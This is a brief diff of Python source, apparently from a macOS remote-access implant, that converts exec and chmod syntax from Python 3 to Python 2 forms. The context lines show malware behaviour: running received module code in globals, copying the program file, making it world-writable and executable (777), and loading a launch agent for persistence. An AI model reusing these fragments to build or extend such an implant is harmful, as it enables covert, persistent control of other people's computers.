@@ -201,7 +201,7 @@ def run_module(module_code):
         sys.stdout = new_stdout
         sys.stderr = new_stderr
 
-        exec(module_code, globals())
+        exec module_code in globals()
         # TODO - Find a way to remove the executed code from globals, probably won't happen though.
 
         # Restore output.
@@ -306,7 +306,7 @@ def setup_persistence():
             output_file.write(input_file.read())
     else:
         os.rename(__file__, get_program_file())
-    os.chmod(get_program_file(), 0o777)
+    os.chmod(get_program_file(), 0777)
 
     # Load launch agent
     log.debug("Loading launch agent...")
